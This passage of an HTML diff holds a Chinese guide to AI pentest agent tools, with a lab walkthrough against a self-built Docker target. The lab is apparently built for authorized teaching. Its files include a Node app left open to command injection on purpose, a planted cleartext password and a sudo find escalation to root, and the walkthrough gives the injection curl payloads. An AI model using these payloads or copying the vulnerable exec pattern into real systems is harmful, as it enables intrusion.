+        <li>目标是<b>下次不用 agent 重新发现</b>，CI 里 30 秒跑完。</li>
+        <li>这一步做完，报告才真正降低了边际成本。</li>
+      </ul>
+    </div>
+    <div class="panel">
+      <h3>⑥ 反哺 agent 评测</h3>
+      <ul>
+        <li>把历史 finding 做成私有 benchmark，比 Cybench 更贴近你的业务。</li>
+        <li>指标：<code>confirmed</code> 占比 = 复现率，直接衡量 agent 的幻觉水平。</li>
+        <li>再加两项：人类干预次数、每洞 token 成本。三项一起看才不会被刷分骗。</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="callout ok">
+    <strong>闭环指标怎么算：</strong>复现率 = confirmed ÷（confirmed + hypothesis）。这个数字低于 0.6 时，报告的「高危」标签基本不可信，先把闸门 3（复现回放）补上，而不是加更多 prompt。
+  </div>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">报告环节的常见失败模式</h3>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>症状</th><th>根因</th><th>处置</th></tr></thead>
+      <tbody>
+        <tr><td>报告中出现「可能存在」类措辞，客户拒收</td><td>缺证据绑定，模型自由发挥</td><td>加证据闸门，无 id 一律降级并标「待验证」</td></tr>
+        <tr><td>高危一大堆，实际都被拒</td><td>定级沿用模型给的分数</td><td>改为向量计算 + 人审，业务影响单独字段</td></tr>
+        <tr><td>复测时对不上账</td><td>每轮重新生成 id</td><td>id 稳定化，跨轮次复用</td></tr>
+        <tr><td>报告很长但没人看</td><td>只出了一套受众视图</td><td>同数据三渲染：摘要 / 技术 / 工单</td></tr>
+        <tr><td>同一问题反复报</td><td>无去重与根因合并</td><td>按 root cause 聚合，保留最强证据</td></tr>
+        <tr><td>修复建议无法执行</td><td>泛泛而谈的模板话术</td><td>强制指向组件/代码位置 + 可执行验收标准</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section id="case">
+  <h2><span class="num">05 / WALKTHROUGH</span>实战案例：一台机器打到 root，三个工具各管一段</h2>
+  <p class="sub">
+    把 PentestGPT、hackingbuddyGPT、Cybench 串成一条真实链路：前两个负责"打"，第三个负责"证明你打得怎么样"。
+    靶场是我现搭的 Docker 环境，下面的攻击链命令与回显<strong>都在本机实跑过</strong>；两个 agent 的会话输出标注为「示例」，因为它们需要 API key 与联网，我没有替你跑。
+  </p>
+
+  <div class="cols">
+    <div class="panel">
+      <h3>三个工具，三段不重叠的能力</h3>
+      <ul>
+        <li><b>PentestGPT · 规划</b> 把模糊目标拆成有序动作，维持一棵任务树，提醒你别漏面。它不执行、不扫描，是副驾驶。</li>
+        <li><b>hackingbuddyGPT · 执行窄任务</b> 给定低权凭据，自主尝试提权，每步给解释。任务边界清晰，所以它最可靠。</li>
+        <li><b>Cybench · 定标</b> 40 道 CTF 题给出分布分数，回答"这次成功是不是运气"。</li>
+      </ul>
+    </div>
+    <div class="panel">
+      <h3>场景与边界（写在最前面）</h3>
+      <ul>
+        <li>目标：自建容器 <code>redlab-target</code>，监听 <code>8080</code>（Node 写的"联通性检测"服务）与 <code>22</code>（sshd）。</li>
+        <li>授权：仅限本机 Docker 网络内的这台容器，测试窗口 30 分钟。</li>
+        <li>禁止：任何形式的对外扫描、DoS、持久化后门。</li>
+        <li>产出：3 条 finding + 1 条完整提权链，按上一章的 schema 落地。</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">5.1 先看终点：五步链路</h3>
+  <div class="pipe">
+    <div class="step"><b>侦察</b><span>22 / 8080 两个服务，8080 是自研 Node 应用</span></div>
+    <div class="step"><b>命令注入</b><span>/ping?host= 拼接进 exec，拿到 web 用户 RCE</span></div>
+    <div class="step"><b>凭据泄露</b><span>web 用户 home 下的部署脚本里有 dev 的密码</span></div>
+    <div class="step"><b>横向</b><span>ssh dev@target 登录成功</span></div>
+    <div class="step out"><b>提权到 root</b><span>sudo NOPASSWD /usr/bin/find → GTFOBins → root</span></div>
+  </div>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">5.2 靶场本身：四个文件，两分钟起 <span class="badge real">实测</span></h3>
+  <p class="sub" style="margin-bottom:6px">故意做小的漏洞面：一个注入点、一处凭据泄露、一条 sudoers 配置错误。目的不是炫技，是让三个工具都有活干。</p>
+
+<pre><code><span class="c"># docker-compose.yml</span>
+services:
+  target:
+    build: .
+    container_name: redlab-target
+    hostname: netcheck
+    ports:
+      - "28022:22"      <span class="c"># 非标准端口，模拟"不是 22"的情况</span>
+      - "28080:8080"
+</code></pre>
+
+<pre><code><span class="c"># Dockerfile</span>
+FROM node:22-bookworm-slim
+RUN apt-get update \
+ &amp;&amp; apt-get install -y --no-install-recommends openssh-server iputils-ping sudo procps curl \
+ &amp;&amp; rm -rf /var/lib/apt/lists/*
+RUN useradd -m -s /bin/bash dev &amp;&amp; echo 'dev:dev123' | chpasswd \
+ &amp;&amp; useradd -m -s /bin/bash web &amp;&amp; echo 'web:web123' | chpasswd
+COPY app.js /opt/app/app.js
+COPY entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh &amp;&amp; mkdir -p /run/sshd \
+ &amp;&amp; echo 'dev ALL=(ALL) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/dev \
+ &amp;&amp; chmod 440 /etc/sudoers.d/dev
+<span class="c"># 模拟"运维图省事"：web 的 home 里留了一份带明文密码的部署脚本</span>
+RUN printf '#!/bin/bash\nsshpass -p dev123 ssh dev@10.0.0.5 uptime\n' > /home/web/.deploy.sh \
+ &amp;&amp; chown web:web /home/web/.deploy.sh &amp;&amp; chmod 600 /home/web/.deploy.sh
+RUN echo 'FLAG{gtfobins_find_to_root}' > /root/flag.txt &amp;&amp; chmod 600 /root/flag.txt
+EXPOSE 22 8080
+CMD ["/entrypoint.sh"]
+</code></pre>
+
+<pre><code><span class="c">// app.js —— 漏洞点在这里：exec 的字符串拼接</span>
+const { exec } = require('child_process');
+if (u.pathname === '/ping') {
+  const host = u.query.host || '127.0.0.1';
+  exec(`ping -c 1 ${host}`, { timeout: 4000 }, (err, stdout, stderr) =&gt; {
+    res.end([stdout, stderr, err ? 'error: ' + err.message : ''].join('\n'));
+  });
+}
+</code></pre>
+
+<pre><code>docker compose build &amp;&amp; docker compose up -d
+<span class="c"># 起容器后确认两个端口都在</span>
+docker ps --filter name=redlab-target --format '{{.Status}} | {{.Ports}}'
+</code></pre>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">5.3 阶段 A · PentestGPT：把"该测什么"排出来</h3>
+  <p class="sub" style="margin-bottom:6px">
+    PentestGPT 的关键用法不是"让它打"，是<strong>把你的观察回填进去，让任务树保持正确</strong>。下面是典型的三轮会话形态
+    <span class="badge demo">示例会话</span>，重点看它每轮输出什么结构。
+  </p>
+
+<pre><code><span class="p">&gt;</span> 目标 10.0.0.10:8080 与 :22，授权仅限该主机，窗口 30 分钟，只做只读探测与 PoC 验证
+<span class="c"># 它会把 scope 写进任务树根节点，之后每步都重申一遍</span>
+
+<span class="p">&gt;</span> [粘贴 nmap 结果] 22/tcp open ssh OpenSSH 9.2p1 Debian
+                    8080/tcp open http Node.js
+<span class="c"># 输出的任务树大致长这样：</span>
+<span class="c">#   Priority 1  web 面 —— 8080 为自研应用，攻击面最大</span>
+<span class="c">#   Priority 2  凭据 —— 先找有无泄露，再考虑 22</span>
+<span class="c">#   Priority 3  后渗透 —— 仅在有 shell 后展开</span>
+
+<span class="p">&gt;</span> 8080 上有个 /ping?host= 的接口，帮我想这类接口的测试点
+<span class="c"># 输出假设清单：SSRF / 命令注入 / 参数污染 / 时间盲注</span>
+</code></pre>
+
+  <p class="sub" style="margin:14px 0 6px">它给出的「命令注入」假设，用一条 curl 就能证伪或证实——这一步人工做比让 agent 做快得多 <span class="badge real">实测</span>：</p>
+
+<pre><code>curl -s 'http://10.0.0.10:8080/ping?host=127.0.0.1;id'
+</code></pre>
+
+<pre><code><span class="c"># 真实回显</span>
+uid=1002(web) gid=1002(web) groups=1002(web)
+</code></pre>
+
+  <p class="note">到这里 F-001 就可以标 <code>confirmed</code> 了：有原始请求、有原始响应、有两次复现。注意这一步<strong>不需要 agent</strong>——它是假设的验证者，不是验证本身。</p>
+
+  <p class="sub" style="margin:14px 0 6px">顺手把 RCE 当读取原语，翻 home 目录 <span class="badge real">实测</span>：</p>
+
+<pre><code>curl -s 'http://10.0.0.10:8080/ping?host=x;cat%20/home/web/.deploy.sh'
+</code></pre>
+
+<pre><code><span class="c"># 真实回显（已滤掉 ping 报错噪音）</span>
+#!/bin/bash
+sshpass -p dev123 ssh dev@10.0.0.5 uptime
+</code></pre>
+
+  <p class="note">这一步是整条链的关键：注入本身只是"能执行"，而凭据泄露把它变成了"能横向"。PentestGPT 的任务树会提示"Priority 2 凭据"，但<strong>它不会告诉你去翻哪个文件</strong>——那是人根据经验加的。</p>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">5.4 阶段 B · hackingbuddyGPT：拿到凭据之后交给它</h3>
+  <p class="sub" style="margin-bottom:6px">
+    这一步是三者里最适合自动化的：目标明确（root）、边界清晰（一台主机）、有客观成功标准（<code>id</code> 输出 root）。
+  </p>
+
+<pre><code>pip install hackingbuddyGPT
+
+python3 -m hackingbuddyGPT.getroot_linux \
+  --host 10.0.0.10 --username dev --password dev123 \
+  --enable_explanation
+<span class="c"># 参数名以仓库 README 为准；--enable_explanation 让它每步给出理由</span>
+</code></pre>
+
+  <p class="sub" style="margin:14px 0 6px">它跑起来是"观察 → 假设 → 执行 → 修正"的循环，典型输出形态 <span class="badge demo">示例输出</span>：</p>
+
+<pre><code>[Turn 1] 观察：确认身份与权限边界
+  $ id &amp;&amp; uname -a &amp;&amp; sudo -l
+  -&gt; sudoers 允许 (ALL) NOPASSWD: /usr/bin/find
+
+[Turn 2] 假设：find 可执行任意命令，属 GTFOBins 提权
+  $ sudo find . -exec /bin/sh -p \; -quit
+  -&gt; uid=0(root)
+
+[Turn 3] 验证：读取受保护文件确认影响面
+  $ cat /root/flag.txt
+  -&gt; FLAG{gtfobins_find_to_root}
+</code></pre>
+
+  <p class="sub" style="margin:14px 0 6px">上面这三条命令我在容器里原样跑过，回显一致 <span class="badge real">实测</span>：</p>
+
+<pre><code>docker exec -u dev redlab-target bash -lc 'sudo -l'
+<span class="c"># User dev may run the following commands on netcheck:</span>
+<span class="c">#     (ALL) NOPASSWD: /usr/bin/find</span>
+
+docker exec -u dev redlab-target bash -lc 'sudo find / -maxdepth 0 -exec /bin/sh -c "id; cat /root/flag.txt" \; -quit'
+<span class="c"># uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="c"># FLAG{gtfobins_find_to_root}</span>
+</code></pre>
+
+  <div class="callout">
+    <strong>两个实操细节：</strong>① 很多提权工具只接受 <code>--host</code>，不吃非标准端口——把容器 22 映射到宿主 22，或在 <code>~/.ssh/config</code> 里配别名（<code>Host lab</code> + <code>Port 28022</code>）再让工具连 <code>lab</code>。
+    ② 确认 sshd 真的开了密码登录：<code>ssh -o BatchMode=yes -p 28022 dev@host true</code> 若返回 <code>Permission denied (publickey,password)</code> 就说明密码通道存在，工具能上。
+  </div>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">5.5 阶段 C · Cybench：给"这次成功"定个标</h3>
+  <p class="sub" style="margin-bottom:6px">
+    前三步只证明了 <strong>n=1</strong>。想回答"这套组合是稳定有效还是碰巧"，只有基准能给。
+  </p>
+
+<pre><code><span class="c"># 路线一：Cybench 自带 harness（会拉 CTF 环境容器，需要 Docker）</span>
+git clone https://github.com/andyzorigin/cybench &amp;&amp; cd cybench
+uv sync        <span class="c"># 或 pip install -e .</span>
+export OPENAI_API_KEY=...
+python -m cybench.run --model gpt-4o --subset web
+
+<span class="c"># 路线二：走 Inspect AI（更适合接自有模型/自建端点）</span>
+pip install inspect-ai
+inspect eval inspect_evals/cybench --model anthropic/claude-sonnet-4 --limit 5
+</code></pre>
+  <p class="note"><span class="badge demo">用法示意</span> 参数名随版本变动，以仓库 README 为准。先用 <code>--limit 5</code> 跑通链路，再放开全量。</p>
+
+  <div class="tablewrap" style="margin-top:14px">
+    <table>
+      <thead><tr><th>看什么</th><th>怎么读</th><th>为什么重要</th></tr></thead>
+      <tbody>
+        <tr><td>unguided / guided 分差</td><td>同一题给 hint 后是否明显提升</td><td>差值大 = 工具与接口问题；都低 = 模型能力问题。诊断方向完全不同</td></tr>
+        <tr><td>单任务 token 成本</td><td>总 token ÷ 通过题数</td><td>决定这套东西能不能进日常，而不是只做 Demo</td></tr>
+        <tr><td>超时 / 卡死率</td><td>跑到步数上限仍未收敛的比例</td><td>真实项目里"卡住"比"失败"更贵，占着窗口不产出</td></tr>
+        <tr><td>失败任务的形态</td><td>是没找到洞，还是找到了没打通</td><td>后者说明该加执行层（如 hackingbuddyGPT），前者说明该加侦察</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p class="note" style="margin-top:12px">成本量级：40 题、每题多轮工具调用，属于「几十万 token + 1~3 小时机器时间」这一档。所以实践上只用它做<strong>版本闸门</strong>（换模型、换 prompt、换工具层时各跑一次），不要每改一行就跑全量。</p>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">5.6 落成报告：三条 finding + 一条链</h3>
+  <p class="sub" style="margin-bottom:6px">按第 3 章的 schema，这次测试的产出是三个对象，以及它们串起来的整体风险。下面给最短可用的形态：</p>
+
+<pre><code>{
+  "id": "F-001",
+  "title": "NetCheck /ping 接口命令注入导致远程代码执行",
+  "asset": "http://10.0.0.10:8080",
+  "cwe": "CWE-78",
+  "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+  "confidence": "confirmed",
+  "evidence_ids": ["ev-a1", "ev-a2"],
+  "attack_path": [
+    "GET /ping?host=127.0.0.1;id 返回命令输出而非 ping 结果",
+    "输出 uid=1002(web)，确认以 web 用户执行"
+  ],
+  "poc": "curl -s 'http://10.0.0.10:8080/ping?host=127.0.0.1;id'",
+  "remediation": "改用 execFile('ping', ['-c','1',host]) 并以白名单校验 host"
+}
+
+{
+  "id": "F-002",
+  "title": "web 用户 home 下部署脚本含明文凭据（dev:dev123）",
+  "cwe": "CWE-798",
+  "confidence": "confirmed",
+  "evidence_ids": ["ev-a3"],
+  "remediation": "改用 SSH key 或密钥管理服务；轮换已泄露口令"
+}
+
+{
+  "id": "F-003",
+  "title": "dev 用户 sudo NOPASSWD /usr/bin/find 可提权至 root",
+  "cwe": "CWE-269",
+  "confidence": "confirmed",
+  "evidence_ids": ["ev-a4", "ev-a5"],
+  "remediation": "取消 find 的 sudo 授权；确需只读排查则封装固定参数脚本"
+}
+</code></pre>
+
+  <div class="callout ok">
+    <strong>整体结论怎么写：</strong>三条单独看是 Medium 级问题，串起来是「未授权 → root」的完整链，整体风险按 Critical 记。
+    报告里必须写清这一点，否则客户会把 F-002 当成"配置不规范"排到下一季度——这是渗透报告最常见的失分点。
+  </div>
+
+  <h3 style="margin:34px 0 6px;font-size:17px">5.7 复盘：哪一步真的省了时间</h3>
+  <div class="tablewrap">
+    <table>
+      <thead><tr><th>环节</th><th>谁干的</th><th>耗时</th><th>结论</th></tr></thead>
+      <tbody>
+        <tr><td>侦察与接口枚举</td><td>PentestGPT + 人工回填</td><td>~20 min</td><td>它负责不漏面，人负责判断哪个面值得花时间</td></tr>
+        <tr><td>注入假设 → 验证</td><td>PentestGPT 提假设，curl 验证</td><td>~3 min</td><td>这类"一条命令能证伪"的事，别交给 agent 兜圈子</td></tr>
+        <tr><td>凭据横向</td><td>人工（经验驱动）</td><td>~5 min</td><td>agent 不会主动想到"翻 home 里的脚本"，这是人的价值</td></tr>
+        <tr><td>提权</td><td>hackingbuddyGPT</td><td>~10 min / 若干轮</td><td>三段里最适合自动化的，边界清晰、成功标准客观</td></tr>
+        <tr><td>定标</td><td>Cybench</td><td>1~3 h</td><td>不是每次都跑，只在换模型/换工具层时跑一次当闸门</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout">
+    <strong>这次案例真正的结论：</strong>三个工具里，<strong>只有 hackingbuddyGPT 的产出直接可用</strong>；PentestGPT 的价值在"不漏面"和"给假设清单"；Cybench 的价值在"防止你被单次成功骗到"。
+    把所有环节都交给 agent 的团队，通常在第 3 步（凭据横向）就停住了——因为那一步的输入是人的经验，不是扫描结果。
+  </div>
+</section>
+
+<section id="pick">
+  <h2><span class="num">06 / CHOOSE</span>按你的目的选，别按热度选</h2>
+  <p class="sub">同一个问题「该用哪个」有四种答案，取决于你要的是演示、研究、生产还是合规。</p>
+
+  <div class="pick">
+    <article>
+      <p class="goal">GOAL · 一周内跑通 demo</p>
+      <b>HexStrike AI + 任一模型</b>
+      <p>或直接 PentAGI 起一套。别自己写工具 wrapper，90% 的工程量在那里。</p>
+    </article>
+    <article>
+      <p class="goal">GOAL · 做研究 / 写论文</p>
+      <b>PentestGPT + hackingbuddyGPT + Cybench</b>
+      <p>前者当 baseline，中者提供可复现场景，后者出分。三者缺一，reviewer 会问。</p>
+    </article>
+    <article>
+      <p class="goal">GOAL · 真实授权项目</p>
+      <b>Vulnhuntr / AIxCC CRS 类窄而深工具</b>
+      <p>agent 只负责侦察扩散与报告草稿，定性与定级留给人。端到端自主渗透暂不进生产。</p>
+    </article>
+    <article>
+      <p class="goal">GOAL · 自建内部平台</p>
+      <b>CAI 或自研 + HexStrike 工具层</b>
+      <p>要的是可审计：作用域限制、每次工具调用留痕、成本可计量。这三点比模型强弱更重要。</p>
+    </article>
+  </div>
+
+  <div class="callout">
+    <strong>三条红线（这几类工具特别容易踩）：</strong><br>
+    ① 只在<strong>有书面授权</strong>的目标上运行；赏金项目严格守 scope 文件，越界一次就是违规而不是失误。<br>
+    ② 优先选自带沙箱与作用域限制的（PentAGI、CAI、Strix 有容器隔离），裸跑 agent 打生产环境是事故高发区；<br>
+    ③ 报告与日志里可能含真实凭据与个人数据，<strong>artifact 库要单独加密与留存期限管理</strong>，别直接扔进公共对象存储。
+  </div>
+</section>
+
+<section id="links">
+  <h2><span class="num">07 / SOURCES</span>去仓库看，别只看本文</h2>
+  <p class="sub">命令与参数会变，下面是一手来源。星标与热度是快变量，架构与许可证是慢变量——优先看后者。</p>
+  <div class="linklist">
+    <div><b>PentestGPT</b><a href="https://github.com/GreyDGL/PentestGPT" target="_blank" rel="noopener noreferrer">github.com/GreyDGL/PentestGPT</a></div>
+    <div><b>CAI</b><a href="https://github.com/aliasrobotics/cai" target="_blank" rel="noopener noreferrer">github.com/aliasrobotics/cai</a></div>
+    <div><b>PentAGI</b><a href="https://github.com/vxcontrol/pentagi" target="_blank" rel="noopener noreferrer">github.com/vxcontrol/pentagi</a></div>
+    <div><b>Strix</b><a href="https://github.com/usestrix/strix" target="_blank" rel="noopener noreferrer">github.com/usestrix/strix</a></div>
+    <div><b>Shannon</b><a href="https://github.com/KeygraphHQ/shannon" target="_blank" rel="noopener noreferrer">github.com/KeygraphHQ/shannon</a></div>
+    <div><b>hackingbuddyGPT</b><a href="https://github.com/ipa-lab/hackingBuddyGPT" target="_blank" rel="noopener noreferrer">github.com/ipa-lab/hackingBuddyGPT</a></div>
+    <div><b>HexStrike AI</b><a href="https://github.com/0x4m4/hexstrike-ai" target="_blank" rel="noopener noreferrer">github.com/0x4m4/hexstrike-ai</a></div>
+    <div><b>Vulnhuntr</b><a href="https://github.com/protectai/vulnhuntr" target="_blank" rel="noopener noreferrer">github.com/protectai/vulnhuntr</a></div>
+    <div><b>Buttercup</b><a href="https://github.com/trailofbits/buttercup" target="_blank" rel="noopener noreferrer">github.com/trailofbits/buttercup</a></div>
+    <div><b>EnIGMA</b><a href="https://github.com/SWE-agent/EnIGMA" target="_blank" rel="noopener noreferrer">github.com/SWE-agent/EnIGMA</a></div>
+    <div><b>CALDERA</b><a href="https://github.com/mitre/caldera" target="_blank" rel="noopener noreferrer">github.com/mitre/caldera</a></div>
+    <div><b>Atomic Red Team</b><a href="https://github.com/redcanaryco/atomic-red-team" target="_blank" rel="noopener noreferrer">github.com/redcanaryco/atomic-red-team</a></div>
+    <div><b>Garak</b><a href="https://github.com/NVIDIA/garak" target="_blank" rel="noopener noreferrer">github.com/NVIDIA/garak</a></div>
+    <div><b>PyRIT</b><a href="https://github.com/Azure/PyRIT" target="_blank" rel="noopener noreferrer">github.com/Azure/PyRIT</a></div>
+    <div><b>promptfoo</b><a href="https://github.com/promptfoo/promptfoo" target="_blank" rel="noopener noreferrer">github.com/promptfoo/promptfoo</a></div>
+    <div><b>PurpleLlama</b><a href="https://github.com/meta-llama/PurpleLlama" target="_blank" rel="noopener noreferrer">github.com/meta-llama/PurpleLlama</a></div>
+    <div><b>DARPA AIxCC</b><a href="https://www.darpa.mil/research/programs/ai-cyber-challenge" target="_blank" rel="noopener noreferrer">darpa.mil · AI Cyber Challenge</a></div>
+    <div><b>Nuclei</b><a href="https://github.com/projectdiscovery/nuclei" target="_blank" rel="noopener noreferrer">github.com/projectdiscovery/nuclei</a></div>
+  </div>
+  <p class="note" style="margin-top:18px">Nebula / BugTraceAI / 各评测基准的仓库地址迭代较快，本文只标注到组织层级，请按名称在 GitHub 搜索确认后再使用。</p>
+</section>
+
+</div>
+</main>
+
+<footer>
+  <div class="wrap">
+    <span>AI Agent 红队网络攻防 · 开源项目地图与使用手册</span>
+    <span>仅供授权的安全测试与防御性研究使用</span>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ---------- 1. 筛选 + 搜索 ---------- */
+  var cards = Array.prototype.slice.call(document.querySelectorAll(".card"));
+  var chips = Array.prototype.slice.call(document.querySelectorAll(".chip"));
+  var input = document.getElementById("q");
+  var count = document.getElementById("count");
+  var empty = document.getElementById("empty");
+  var activeCat = "all";
+  var total = cards.length;
+
+  var index = cards.map(function (card) {
+    return (card.textContent || "").toLowerCase();
+  });
+
+  function apply() {
+    var q = (input.value || "").trim().toLowerCase();
+    var shown = 0;
+    cards.forEach(function (card, i) {
+      var catOk = activeCat === "all" || card.getAttribute("data-cat") === activeCat;
+      var textOk = q === "" || index[i].indexOf(q) !== -1;
+      var visible = catOk && textOk;
+      card.hidden = !visible;
+      if (visible) shown++;
+    });
+    count.textContent = "显示 " + shown + " / " + total;
+    empty.hidden = shown !== 0;
+  }
+
+  chips.forEach(function (chip) {
+    chip.addEventListener("click", function () {
+      activeCat = chip.getAttribute("data-cat");
+      chips.forEach(function (c) {
+        c.setAttribute("aria-pressed", c === chip ? "true" : "false");
+      });
+      apply();
+    });
+  });
+
+  if (input) {
+    input.addEventListener("input", apply);
+    input.addEventListener("keydown", function (e) {
+      if (e.key === "Escape") { input.value = ""; apply(); }
+    });
+  }
+
+  /* ---------- 2. 代码复制 ---------- */
+  Array.prototype.slice.call(document.querySelectorAll("pre")).forEach(function (pre) {
+    var wrap = document.createElement("div");
+    wrap.className = "codewrap";
+    pre.parentNode.insertBefore(wrap, pre);
+    wrap.appendChild(pre);
+
+    var btn = document.createElement("button");
+    btn.type = "button";
+    btn.className = "copy";
+    btn.textContent = "复制";
+    btn.setAttribute("aria-label", "复制这段代码");
+
+    btn.addEventListener("click", function () {
+      var text = pre.innerText;
+      function done(ok) {
+        btn.textContent = ok ? "已复制" : "失败";
+        setTimeout(function () { btn.textContent = "复制"; }, 1600);
+      }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(function () { done(true); }, function () { done(false); });
+      } else {
+        var ta = document.createElement("textarea");
+        ta.value = text;
+        ta.setAttribute("readonly", "");
+        ta.style.position = "fixed";
+        ta.style.left = "-9999px";
+        document.body.appendChild(ta);
+        ta.select();
+        var ok = false;
+        try { ok = document.execCommand("copy"); } catch (err) { ok = false; }
+        document.body.removeChild(ta);
+        done(ok);
+      }
+    });
+
+    wrap.appendChild(btn);
+  });
+
+  /* ---------- 3. 受众视图 tabs ---------- */
+  Array.prototype.slice.call(document.querySelectorAll("[data-tabs]")).forEach(function (group) {
+    var tabs = Array.prototype.slice.call(group.querySelectorAll('[role="tab"]'));
+    function select(tab) {
+      tabs.forEach(function (t) {
+        var on = t === tab;
+        t.setAttribute("aria-selected", on ? "true" : "false");
+        t.tabIndex = on ? 0 : -1;
+        var panel = document.getElementById(t.getAttribute("aria-controls"));
+        if (panel) panel.hidden = !on;
+      });
+    }
+    if (tabs.length) select(tabs[0]);
+    tabs.forEach(function (tab, i) {
+      tab.tabIndex = i === 0 ? 0 : -1;
+      tab.addEventListener("click", function () { select(tab); });
+      tab.addEventListener("keydown", function (e) {
+        var next = null;
+        if (e.key === "ArrowRight") next = tabs[(i + 1) % tabs.length];
+        if (e.key === "ArrowLeft") next = tabs[(i - 1 + tabs.length) % tabs.length];
+        if (e.key === "Home") next = tabs[0];
+        if (e.key === "End") next = tabs[tabs.length - 1];
+        if (next) { e.preventDefault(); select(next); next.focus(); }
+      });
+    });
+  });
+
+  apply();
+})();
+</script>
+</body>
+</html>
